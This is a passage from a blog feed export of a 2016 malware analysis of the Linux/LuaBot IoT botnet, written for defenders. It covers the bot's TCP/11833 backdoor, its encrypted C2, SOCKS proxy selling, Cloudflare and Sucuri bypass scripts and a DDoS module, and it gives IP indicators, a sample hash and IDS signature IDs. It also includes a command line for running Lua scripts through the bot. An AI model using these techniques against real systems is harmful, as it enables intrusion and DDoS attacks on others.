href=\"https:\/\/lh3.googleusercontent.com\/hAqyMWunD1RF_V0sdJBJ3qI4rCYcmpjfnXzY5KY405T2JA66y8vTZRDA76hEW1ylw6oKpK6skhUlyg=w1331-h903-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/hAqyMWunD1RF_V0sdJBJ3qI4rCYcmpjfnXzY5KY405T2JA66y8vTZRDA76hEW1ylw6oKpK6skhUlyg=w555-h555-no\u003E\u003C\/a\u003E\u003Cbr\u003EPS: There are also some passed values like (traced sent from the lua interpreter to C bind commands), which is used to monitor the bot performance like:\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Eloadavg\u003Cbr \/\u003Ememinfo\u003Cbr \/\u003Euptime\u003Cbr \/\u003Espeed\u003Cbr \/\u003Eioports\u003Cbr \/\u003E\u003C\/pre\u003EAnd now we know exactly why Linux\/Luabot is using getident64() for reading all of these..  \u003Cp\u003EFollowing the decoder trail a bit further, to find these IP to be connected just once and cleaned those up later on...this doesn't look good.. \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/IDaLx5FjvwSH59uAhoKOHOe5eHGJehqB4kScHrwdm_JcvttzLkQ1d-Zzb9Jmx0TeUq5LZZKVkI4xHA=w444-h342-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/IDaLx5FjvwSH59uAhoKOHOe5eHGJehqB4kScHrwdm_JcvttzLkQ1d-Zzb9Jmx0TeUq5LZZKVkI4xHA=w444-h342-no\u003E\u003C\/a\u003E\u003Cbr\u003EWhich leads to the different IP addresses from: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E185.14.30.214 | anna.me. |50673 | 185.14.28.0\/22 | SERVERIUS | NL | itl.net.ua | ITL Company\u003Cbr \/\u003E46.22.211.46 |  |34702 | 46.22.208.0\/20 | WAVECOM | EE | wavecom.ee | Aktsiaselts WaveCom\u003Cbr \/\u003E142.4.215.49 | 4.3.dedicated.sh. |16276 | 142.4.192.0\/19 | OVH | FR | ovh.com | OVH Hosting Inc\u003Cbr \/\u003E\u003C\/pre\u003EThese IP are involved to the botnet activity, could be the victim for the infection or the attack, it is maybe wise to check or contact these nodes' authority further.. There is more explanation of this code in the \u003Ci\u003E\"What is the purpose of Linux\/LuaBot?\"\u003C\/i\u003E section.  \u003Cp\u003EOkay, so far we found many network infrastructure were actually prepared by this botnet...let's continue with the malware process:  \u003Cli\u003EThe malware changes the setting of iptables (Linux firewall) by following method:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/rdDoUbScexw0Pw40FX5o9NPic9YxQXL-V950zSHVhSwGc7_yCPpgKfejITkbN7y0x3WDWSM66qlvrQ=w1396-h513-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/rdDoUbScexw0Pw40FX5o9NPic9YxQXL-V950zSHVhSwGc7_yCPpgKfejITkbN7y0x3WDWSM66qlvrQ=w555-h555-no\u003E\u003C\/a\u003E \u003Cli\u003EAnd finally \u003Cb\u003ELinux\/LuaBot\u003C\/b\u003E is opening backdoor \u0026 listening to all inbound network traffic that uses \u003Cb\u003Eport TCP\/11833\u003C\/b\u003E: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Ebind(8, {sa_family=AF_INET, sin_port=htons(\"11833\"), sin_addr=inet_addr(\"0.0.0.0\")}\u003Cbr \/\u003Elisten(8, 10240)\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cli\u003EBelow is the snapshot for infected state of a linux box by the \u003Cb\u003ELinux\/LuaBot\u003C\/b\u003E is as per tested case:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/d2wlzUZbCWyyiiaukDlRx3d9V3fi_lQRqwikokax0OM4gcijR_WkFwAK39yt-6-FhmpHzhp1i-j7Bw=w1004-h547-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/d2wlzUZbCWyyiiaukDlRx3d9V3fi_lQRqwikokax0OM4gcijR_WkFwAK39yt-6-FhmpHzhp1i-j7Bw=w555-h547-no\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003ENoted, the \u003Cb\u003EUDP\/41029\u003C\/b\u003E is for outbound DNS request, is insignificant and can be changed.\u003C\/i\u003E \u003Cp\u003E\u003Ch2\u003ECNC traffic and Lua coded botnet functions\u003C\/h2\u003E \u003Cp\u003EI guess all of the related data for the CNC traffic already being explained much in the above section, so in this part I just paste the overall CNC traffic monitored during the initial infection of Linux\/LuaBot, which hoping can be used as reference on the infection, and proof of the analysis.  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/Ot8HsSx-N9L8ED6qhySmFqkHJUpRpwYrEElpa2C9lUv3-bFBawEygPRF_qFpyaeBoNmu3xzQ9B2Gvw=w1180-h745-no\"\u003E\u003Cp\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/Ot8HsSx-N9L8ED6qhySmFqkHJUpRpwYrEElpa2C9lUv3-bFBawEygPRF_qFpyaeBoNmu3xzQ9B2Gvw=w580-h745-no\u003E\u003C\/a\u003E \u003Cp\u003EThere are plenty trace of lua code can be found in this single cute tiny ARM ELF, but my favorite is the way \u003Cb\u003ELinux\/LuaBot\u003C\/b\u003E sends \u003Ci\u003EHTTP request\u003C\/i\u003E to the remote sites, for the CNC purpose or proxy purpose. \u003Cp\u003EThe decrypted stub that contains IP bulk are data that is parsed to the hardcoded lua \u003Ci\u003EXMLHttpRequest\u003C\/i\u003E function. The reversing effort (read: hacks) shows the below coded API in lua \"pseudo function\" used for the purpose:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/rHThK7AUza3uftnYWVOiMpGuGReGofcBxGPjjPseoooGPvKp4FZOdsl1LfLQRFKgNqbYuocOGgMhqw=w1186-h690-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/rHThK7AUza3uftnYWVOiMpGuGReGofcBxGPjjPseoooGPvKp4FZOdsl1LfLQRFKgNqbYuocOGgMhqw=w555-h555-no\u003E\u003C\/a\u003E\u003Cbr\u003ESo now we know why the MatrixSSL signature is in there, it is used for having the HTTPS connection to any web server using this API.  \u003Cp\u003EBelow are some nice catches that's maybe worth to dig more :)\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/FBi2oQfylr4Stq6uyN_RHChsP3u5ifOMvCjPUYR-nBjcUpYkqiZEIjxLH54iaiw3X6gDATqxopmPog=w865-h380-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/FBi2oQfylr4Stq6uyN_RHChsP3u5ifOMvCjPUYR-nBjcUpYkqiZEIjxLH54iaiw3X6gDATqxopmPog=w333-h380-no\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003EYou can see the arrays say: \"\u003Cb\u003EStop breaking\u003C\/b\u003E\" \u003C\/i\u003Elol :) ..sorry, it's a bit too late!\u003Cbr\u003EOkay, enough joking, what's this trace? If you ever see how some skid in \u003Ci\u003Ehackerland \u003C\/i\u003Etrying to bypass \u003Ci\u003ECloudflare \u003C\/i\u003Eprotected sites by some javascript, here is one, extracted from this LuaBot. A \u003Cb\u003Eping!\u003C\/b\u003E to \u003Ci\u003ECloudflare\u003C\/i\u003E to be aware.\u003Cbr\u003EWell, you can \u003Ci\u003Eeasily\u003C\/i\u003E put anything you want in a botnet if it is based on scripts, can't you?  \u003Cp\u003ENext..let's ping Sucuri team for this:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/fUHw6xWa6THem41YfuEyMKhRbfbikC8I9OToL6ga0aZz54Jg3ylr3hclRVj3F8W5ZMuWIFzZ4d4WBg=w845-h226-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/fUHw6xWa6THem41YfuEyMKhRbfbikC8I9OToL6ga0aZz54Jg3ylr3hclRVj3F8W5ZMuWIFzZ4d4WBg=w333-h226-no\u003E\u003C\/a\u003E\u003Cbr\u003EThis is also the same type as above figure. traces of usage some JS, this part is for Sucuri protection. See the next section for the detail..  \u003Cp\u003EThe coder loves bad vocabulary..  :)\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/MFInT-brPnMeYxZB8g_JoL7Cg3IKb3vAgroqka0_y8kToqYmURF7i_NWsZAES92TpfhiXQ-lzIHF-w=w222-h91-no\u003E\u003Cbr\u003EI think he described his coded malware very well in one word above :D  \u003Cp\u003E\u003Ch2\u003EWhat is the purpose of Linux\/LuaBot?\u003C\/h2\u003E \u003Cp\u003EIn the function at 0x07E2E0 on the reversed code, there are code that usually can be found in the DNS query handling tool, or name server resolver, as per snips below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/4KCB_2aRljP1FTDqWVCaJWM3EC-6QVzjQXS4c2oSfAaFZt96oHHbUXl7yBDk-nsO-2OZTjP8dx7ltg=w1244-h805-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/4KCB_2aRljP1FTDqWVCaJWM3EC-6QVzjQXS4c2oSfAaFZt96oHHbUXl7yBDk-nsO-2OZTjP8dx7ltg=w244-h805-no\u003E\u003C\/a\u003E\u003Cbr\u003EThe code is originated from \u003Cb\u003Eresolver.lua\u003C\/b\u003E and it is interacted with the \u003Cb\u003Eudp.lua\u003C\/b\u003E, as per its name suggesting a lua library used to form \u003Ci\u003EUser Datagram Protocol\u003C\/i\u003E function and \u003Ci\u003Estruct\u003C\/i\u003E, This is showing the \u003Cb\u003ELinux\/LuaBot\u003C\/b\u003E has its own l\u003Ci\u003Eua resolver function\u003C\/i\u003E for the DNS query, and has ability to form its own UDP packet to be sent to any destination, so as its capability to act as independent DNS resolver. Keep this finding in mind, and go look deeper into the source codes extracted, you'll find the HTTP connectivity function, SOCKS server, code for creation sockets for performing TCP along with the mentioned UDP, with some supported libraries intact. If you know what I mean: \u003Cb\u003EThis botnet was designed doesn't need infected system's resource at all to perform its operation!\u003C\/b\u003E \u003Cp\u003EThere's also the \u003Cb\u003Etelnet.lua\u003C\/b\u003E codes compiled after interpreted via lua in this ELF, which is after being reversed it seems to be a simple telnet basic communication functions interpreted in lua language (that can be found many references in the internet) that may allow Linux\/LuaBot to communicate remotely through this protocol.  \u003Cp\u003EOther functions like encoding\/decoding coded in base64, a usage of \u003Cb\u003Eutilizing json operation \u003C\/b\u003Ewith its execution to several purpose (I don't want to disclose this yet), and other lua sources are for supporting the botnet operational activity for this malware.  \u003Cp\u003EAnd, so far...I can't proof any code that can triggered functions in a hostile action, like, being called for flooding or DDoS for example. But, since what I have now is only a one tiny cute ARM file sample, I may miss something with only so few reference I got..  \u003Cp\u003EAnother thing that I don't seek deeper is the \"\u003Ci\u003Epenetrate_sucuri\u003C\/i\u003E\" part, a symbol (a reversed lua function) traced to be coded in the lua source file: *cough* \"checkanus_sucuranus.lua\" and there's also \"checkanus.lua\", which \u003Ci\u003EI took only a peek\u003C\/i\u003E for it, it forms (http) action to a defined target. I'll leave the engineer experts on Sucuri team friends to analyze that part deeper, but by its name it may suggested to a penetration or a bypassing method into their protection scheme.\u003Cbr\u003EEDIT: see the below section to see how the \u003Ci\u003ESucuri \u003C\/i\u003Eor \u003Ci\u003ECloudflare \u003C\/i\u003Ecracking script is used by \u003Cb\u003ELinux\/Luabot\u003C\/b\u003E.  \u003Cp\u003E\u003Cb\u003EOkay..okay..So what's the purpose of this malware??\u003C\/b\u003E   \u003Cp\u003EThis malware is served as botnet aiming ARM architecture IoT Linux machines, and it is built with encrypted C2 communication protocol. The botnet is using \u003Ci\u003EMatrixSSL\u003C\/i\u003E on \u003Cb\u003E\u003Ci\u003Eed25519 crypto\u003C\/i\u003E\u003C\/b\u003E to for the overall \u003Ci\u003ECNC communication commands\u003C\/i\u003E. The communication data \u003Cb\u003Eis also XOR masked\u003C\/b\u003E to prevent textual easy readings or leaks. The concept of the encryption used is not that savvy by my personal opinion, but by signing its CNC communication commands is preventing \u003Cb\u003ELinux\/Luabot\u003C\/b\u003E CNC communication from being hijacked easily, which is the purpose for usage of \u003Ci\u003EMatrixSSL \u003C\/i\u003Eon this botnet.  \u003Cp\u003EIf you see carefully in the above description, there are the \u003Cb\u003E\"cmdline\"\u003C\/b\u003E, and \u003Cb\u003E\"cmdline args\"\u003C\/b\u003E spotted in several parts in ELF reversed code, forensics results and also source code trace too. The hacker can do a lot of things with it via a crypted remote commands pushed to his bots through this command interface, so this bot can be used to execution for the lua script. So one of the botnet functionality is the remote execution via this interface. For instance, you can execute the bot to perform an action by the command of: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E.\/LuaBot_filename [path]{Luascript_filename}.lua\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E\u003Cb\u003ELinux\/Luabot\u003C\/b\u003E works in lua script as modular basis, seeing by the compiling trace and size, it was built from what I suspect from a \u003Ci\u003Enative Lua compiler\u003C\/i\u003E (see reference in latest version of Lua) \u003Ci\u003Ewith libc\u003C\/i\u003E. It is enriched with the possible additional, or modification, and improvement as a framework that can be modified in a snap thus to be pushed to the next infection chain. This is what makes the design for botnet is flexible, and all can be done in scripting mode.  \u003Cp\u003EEDIT: I was just receiving request to PoC the argument execution, and also from other email asked to post some scripts I reversed, for the command argument execution I can share it as per below, these are a reversed code and it goes something like below, you'll get the idea:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/yrZJ5NRSfKXxnMuCz03almZ-TAd-aAnD6dsk4Slk7XARzY0lld7HPdX7VOx1sv3SqgFozoBIum1gdA=w798-h861-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/yrZJ5NRSfKXxnMuCz03almZ-TAd-aAnD6dsk4Slk7XARzY0lld7HPdX7VOx1sv3SqgFozoBIum1gdA=w555-h861-no\u003E\u003C\/a\u003E \u003Cp\u003ETo make a further amazement, the \u003Cb\u003ELinux\/LuaBot\u003C\/b\u003E is not only having one interpreter, which is lua, mainly, obviously, but it has the \u003Ci\u003Ejavascript interpreter\u003C\/i\u003E that can execute the javascript commands that is needed to crack some protected sites like \u003Ci\u003ECloudflare \u003C\/i\u003Eor \u003Ci\u003ESucuri\u003C\/i\u003E. Some traces I showed above are part of the proof for this concept. For this purpose. the coder seems making much effort to integrate \u003Cb\u003EV7 embedded JavaScript engine\u003C\/b\u003E inside, The JavaScripts integrated in the Lua scripts with, sorry, *cough* \u003Ci\u003E\"*anus*.lua\"\u003C\/i\u003E scripts part is meant for bypassing \u003Ci\u003ESucuri \u003C\/i\u003Eprotected site or to evade \u003Ci\u003ECloudflare \u003C\/i\u003Eprotection sites, so show the origin IP location. This is also suggesting offensive function.  \u003Cp\u003EI kept \"this\" information in secret before being very sure before writing it, but I think I now figured how the coder sells this botnet, by what service. The merchandise of selling is mostly the created or served SOCKS itself. As we are all know that many of the blackhat crooks are using SOCKS for proxy servicing their daily activity like for cushion to send spams, or trafficking for a malware infection, cushion for exploiting a site or device, and so on. And the config pushed to the Linux\/LuaBot contains the latest SOCKS data to be served for that purpose.   \u003Cp\u003EIn one of pictures previously shown, here I pasted it again below, explaining a great deal on how the coder (which also the herder) is using these socks practically:\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/IDaLx5FjvwSH59uAhoKOHOe5eHGJehqB4kScHrwdm_JcvttzLkQ1d-Zzb9Jmx0TeUq5LZZKVkI4xHA=w444-h342-no\u003E\u003Cbr\u003E..this is a nice demonstration for a temporary usage of SOCKS itself for some bad purpose. In the case it's showing the temporary usage for some defined SOCKS to be leaned up afterward. Such command like this that can be pushed by the command from the CNC to each of the Linux\/LuaBot client. The shown picture is explaining the attempt to use SOCKS for cushion to illegal activities like: attacking the mentioned IP addresses for the bad purpose or hacking and so on...  Linux\/LuaBot is capable to serve as a framework providing bad guys with this cushion.  \u003Cp\u003EAnother thing that I am quite certain too now is, different to the most ELF malware or Linux botnet  spotted before, which are mostly communicating to the remote site via web protocol (to download something, or to fetch some data) is using \u003Cb\u003Ewget\u003C\/b\u003E (either busybox or static ones), or maybe using \u003Cb\u003EcURL\u003C\/b\u003E library\/command, LuaBot is utilizing the MatrixSSL and XMLHttpRequest to make it possible to communicate to any web remote site on his own native code and with is having full support on SSL encryption (via HTTPS). I'd say this is smart.   \u003Cp\u003ESo far we think the coder is making his point that he can create \u003Ci\u003Efully undetected\u003C\/i\u003E ELF botnet with encrypted communication easily from using \u003Ci\u003Elua script\/language\u003C\/i\u003E aiming IoT, and he is promoting Linux\/LuaBot that can be used for \u003Cb\u003E\"Botnet As a (malicious) Service\"\u003C\/b\u003E by selling SOCKS connection and also serving the \u003Ci\u003E\u003Cb\u003Eet cetera payloads\u003C\/b\u003E\u003C\/i\u003E. That's why he put some of his email contacts openly...he tries to say that \u003Ci\u003E\"he needs a job\"\u003C\/i\u003E.   \u003Cp\u003EThere is a serious flaw in this botnet, which made me possible to reverse most of the things, for the security purpose let this be a secret, also, there are \u003Ci\u003Eplenty of undone and unused parts\u003C\/i\u003E, along with some unnecessary traced codes too. Our team is now having a strong opinion that parts of the sample is on \u003Ci\u003Edevelopment stage\u003C\/i\u003E.  \u003Cbr\u003EPlease take the rain check for these part as additional information, I will update information upon new reversing result confirmed.  \u003Ca name=ddos\u003E\u003Cbr\u003E\u003Cp\u003E\u003Ch2\u003E\u003Cfont color=yelllow\u003E\u003Cb\u003EUpdate: \u003C\/b\u003E\u003C\/font\u003EThe \"separate\" ELF DDoS \"module\" for \u003Cb\u003ELinux\/LuaBot\u003C\/b\u003E\u003C\/h2\u003E \u003C\/a\u003E \u003Ci\u003E\u003Cp\u003E\u003Cb\u003ELinux\/Luabot DDoS effort using ELF binary module\u003C\/b\u003E\u003C\/i\u003E \u003Cp\u003EApproximately 4 hours ago the same person was sending another ARM in ELF stripped sample, thank you again. \u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/mJPgH7hSR3hc387bpn-HquQ5MafVWDeT9Z07zkiHXg7MmLRnbKBBRrtEJwQ6DpDdo9PckN89LleiXg=w333-h97-no\u003E\u003Cbr\u003EThis sample [\u003Ca href=\"https:\/\/virustotal.com\/en\/file\/0206efba7fc13700efd59354e9c6ca4d1ffe34f6689bd195798181824d46b83d\/analysis\/1473171435\/\"\u003Elink\u003C\/a\u003E] is explaining the \"missing link\" of the DDoS function expected from this botnet. This module was coded in Lua and using the same static compilation environment, with zero detection ratio too. This additional ELF could be \"the payload\" that we are waiting for. This module is explaining a lot of detail on how the attack is performed, a simple download and execution command executed by the infected nodes from remote access via shell or internal command line interface is enough to trigger this attack.  \u003Cp\u003EBelow is the file details: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E:\u003E !file dcc\u003Cbr \/\u003Edcc: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, stripped\u003Cbr \/\u003E:\u003E !md5sum dcc\u003Cbr \/\u003E8e7637d72e522cb52012c02eb8ddfdbe  dcc\u003Cbr \/\u003E:\u003E date\u003Cbr \/\u003ETue, 06 Sep 2016 14:14:09 GMT + 0\u003Cbr \/\u003E:\u003E\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003EThe targeted site is hard coded in this ELF module, as per seen below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/1gG93M-3eFUyl4PAPGWhUYaQ5GRetv-NNmcOs04H41FOBkRgP2SGKulo-W7-xhSJ1kb5qwZ-UehUTg=w1265-h578-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/1gG93M-3eFUyl4PAPGWhUYaQ5GRetv-NNmcOs04H41FOBkRgP2SGKulo-W7-xhSJ1kb5qwZ-UehUTg=w555-h578-no\u003E\u003C\/a\u003E \u003Cp\u003EHTTP (L7) GET headers used for flooding is generated with following composition:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/wobmoKadPcy56ahoNfzOhxyf-zVl9kuikcUy8s9F29AaNn_4dPsASdVnuiIaSsfKUKyRR87KYY6NBg=w1203-h730-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/wobmoKadPcy56ahoNfzOhxyf-zVl9kuikcUy8s9F29AaNn_4dPsASdVnuiIaSsfKUKyRR87KYY6NBg=w555-h730-no\u003E\u003C\/a\u003E \u003Cp\u003EThe attack process are mainly managed in main function at [0x00010ac0] and the loop for flood process can be confirmed between the range of address described below;\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/JO1eA-MbY-XjhdxY874yzndBWtRu20tijQpfVFRbia6JVjfH9ssURMfLNLnKTuQ3-VOaUl-N3EYSEQ=w881-h632-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/JO1eA-MbY-XjhdxY874yzndBWtRu20tijQpfVFRbia6JVjfH9ssURMfLNLnKTuQ3-VOaUl-N3EYSEQ=w555-h632-no\u003E\u003C\/a\u003E \u003Cp\u003ENoted, the binary needs specific \"environment\", if you're inexperienced with handling it, you may meet a SIGILL (sig 4) during runtime if the condition is unmatched. \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E:\u003E dc\u003Cbr \/\u003E[+] signal 4 aka SIGILL received 0\u003Cbr \/\u003E:\u003E \u003C\/pre\u003E \u003Cp\u003EThe interesting trace found in the DoS module ELF is as per below screenshot, a self explanatory.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/qtvZ_c6eZkhmqAi72YcWe3QwtY9biszD-_zq3oBI5K7U5GH8g5PfkGIc2-gsRLkzxvqd8KhUoHy5Mg=w1002-h565-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/qtvZ_c6eZkhmqAi72YcWe3QwtY9biszD-_zq3oBI5K7U5GH8g5PfkGIc2-gsRLkzxvqd8KhUoHy5Mg=w555-h565-no\u003E\u003C\/a\u003E \u003Ci\u003E\u003Cp\u003E\u003Cb\u003ELinux\/Luabot DDoS effort using the Lua script module\u003C\/b\u003E\u003C\/i\u003E \u003Cp\u003EAs per explained in the previous parts, Lua script can be executed by Linux\/LuaBot via argument for the command line execution too. The PoC for it can be reversed from the botnet itself like per following reformed Lua script. I put a lot of comments in the picture for understanding how it does: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/rnQDe_i_YIYbaHBtpDaGhShwpHqbppmtcv-1T6mMb9HIotuRtlU69Gr-v00yBize3RP69m-ifYSMkw=w947-h957-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/rnQDe_i_YIYbaHBtpDaGhShwpHqbppmtcv-1T6mMb9HIotuRtlU69Gr-v00yBize3RP69m-ifYSMkw=w580-h957-no\u003E\u003Cbr\u003E\u003C\/a\u003E\u003Ci\u003EThank's for requesting me to post this script.. I believe I had all of the malicious aspects and parts reversed well by now.\u003C\/i\u003E \u003Cp\u003E\u003Ch2\u003EEpilogue and follow up\u003C\/h2\u003E \u003Cp\u003E\u003Cli\u003EThere are plenty new ELF malware coming \u0026 lurking our network recently \u0026 hitting out Linux layer IoT and services badly, let's watch for unusual hazards for the security of our 24\/7 running Linux nodes, they are as important as the personal computers that we all use. \u003Cli\u003EThe traffic filtration for this threat is proposed to ET Labs friends, the protection is available now. If your network is infected with this variant of Linux\/LuaBot, the alert will come up under below identifications: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E  2023155 - ET TROJAN Linux\/LuaBot CnC Beacon\u003Cbr \/\u003E  2023156 - ET TROJAN Linux\/LuaBot CnC Beacon Response\u003Cbr \/\u003E\u003C\/pre\u003EThank you Emerging Threat Labs [\u003Ca href=\"https:\/\/twitter.com\/ET_Labs\/status\/773265768951664641\"\u003Elink\u003C\/a\u003E] engineers! \u003Cli\u003ESamples are shared by RCE expert \u003Cb\u003EXylit0l\u003C\/b\u003E [\u003Ca href=\"https:\/\/twitter.com\/Xylit0l\"\u003Elink\u003C\/a\u003E] to threat research community in KernelMode [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=4470#p29191\"\u003Elink\u003C\/a\u003E]  \u003Cli\u003EDetection ratio from AntiVirus is raised from zero to 20 within 5 days:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/r0Gmdnf1PLK33mbjyQXcicOdxUs4Vc4ArRuvbY333MOTaFepV4wzB9rN6m0EySmnKBSfI5fKC9mdEQ=w1201-h662-no\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/r0Gmdnf1PLK33mbjyQXcicOdxUs4Vc4ArRuvbY333MOTaFepV4wzB9rN6m0EySmnKBSfI5fKC9mdEQ=w555-h662-no\u003E\u003C\/a\u003E\u003Cli\u003ESucuri top hacker \u0026 his experts is analyzing the reversed code for mitigating evasion:\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/WsrZhHYDvjSTlYbzJGOORRFnFnA9YH2sNksb-wf28bH94dGEf8UZe1JDXaSN0CQ5uR1u0oBmzVpQpg=w481-h266-no\u003E\u003Cli\u003ELua is a good language, and using it for compiling ELF ARM binaries is good too, but the usage for making botnet is never good. \u003Cli\u003EThis analysis was done by open source OS (FreeBSD) infrastructure and using plenty of UNIX\/Linux sysadmin tools, for RE itself I use only radare [\u003Ca href=\"http:\/\/radare.org\"\u003Elink\u003C\/a\u003E], I dedicated this post to the R2CON [\u003Ca href=\"http:\/\/rada.re\/con\/\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003EIf you see the binary that works in similar malicious way in your Linux box please kindly share us the sample by uploading them via our sample uploader--\u003E[\u003Ca href=\"http:\/\/x.malwaremustdie.org\/sendsample.html\"\u003Elink\u003C\/a\u003E]   \u003Cp\u003E\u003Ch2\u003EThank you very much for the internet media awareness\u003C\/h2\u003E \u003Cp\u003EWe, MMD thank our good friends in internet media for your fast awareness of this threat:\u003Cbr\u003E1. Softpedia [\u003Ca href=\"http:\/\/news.softpedia.com\/news\/luabot-is-the-first-botnet-malware-coded-in-lua-targeting-linux-platforms-507978.shtml\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E2. SC Magazine [\u003Ca href=\"http:\/\/www.scmagazine.com\/luabot-malware-used-to-launch-ddos-attacks\/article\/520814\/\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E3. Xakep .RU [\u003Ca href=\"https:\/\/xakep.ru\/2016\/09\/06\/luabot\/\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E4. Security News .GR [\u003Ca href=\"https:\/\/www.secnews.gr\/106930\/luabot-botnet-malware-grammeno-lua-stoxeuei-linux\/\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E5. SecurityLab .RU [\u003Ca href=\"http:\/\/www.securitylab.ru\/news\/483763.php\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E6. Information Security News[\u003Ca href=\"http:\/\/www.securitynewspaper.com\/2016\/09\/06\/luabot-first-botnet-malware-coded-lua-targeting-linux-platforms\/\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E7. Infosec Island [\u003Ca href=\"http:\/\/www.infosecisland.com\/blogview\/24818-LuaBot-Linux-Botnet-Is-Written-in-Lua-Language.html\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E8. ISS Source [\u003Ca href=\"http:\/\/www.isssource.com\/botnet-targets-linux-platforms\/\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E9. Security Affairs [\u003Ca href=\"http:\/\/securityaffairs.co\/wordpress\/51155\/malware\/linux-luabot.html\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003Eand others who are not mentioned yet (I am sorry!)  \u003Cp\u003EStay safe friends!  \u003Cp\u003E\u003Ch2\u003E#MalwareMustDie\u003C\/h2\u003E\u003Cbr\u003EReversed, written and analyzed by @unixfreaxjp [\u003Ca href=\"https:\/\/twitter.com\/unixfreaxjp\"\u003Elink\u003C\/a\u003E], September 5th 2016."},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/6333633742073487524\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/09\/mmd-0057-2016-new-elf-botnet-linuxluabot.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/6333633742073487524"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/6333633742073487524"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/09\/mmd-0057-2016-new-elf-botnet-linuxluabot.html","title":"MMD-0057-2016 - New ELF botnet: Linux\/LuaBot"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-962351771858487603"},"published":{"$t":"2016-08-31T19:34:00.000-07:00"},"updated":{"$t":"2016-09-25T14:23:47.240-07:00"},"title":{"type":"text","$t":"MMD-0056-2016 - Linux\/Mirai, how an old ELF malcode is recycled.. "},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EBackground\u003C\/h2\u003E \u003Cp\u003EFrom August 4th 2016 several sysadmin friends were helping us by uploading this malware files to our dropbox. The samples of this particular ELF malware ware not easy to retrieve, there are good ones and also some broken ones, I listed in this post for the good ones only. This threat is made by a new ELF trojan backdoor which is now in on-going stage aiming IoT, the name of the binary is 